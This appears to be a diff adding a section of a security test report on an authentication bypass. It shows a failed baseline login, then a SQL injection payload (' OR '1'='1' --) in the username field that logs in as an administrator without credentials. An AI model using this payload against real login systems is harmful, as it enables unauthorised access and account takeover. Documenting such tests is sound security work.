@@ -1,0 +1,19 @@
+SECTION 2 — AUTHENTICATION BYPASS
+
+Baseline:
+Username = invalid_user
+Password = invalid_password
+Observed = Login failed.
+
+SQL Injection Test:
+Username = ' OR '1'='1' -- 
+Password = x
+
+Observed:
+Login successful!
+Username: admin
+Role: administrator
+
+Conclusion:
+The vulnerable login endpoint was successfully bypassed using SQL injection.
+The application returned the administrator account without valid credentials.
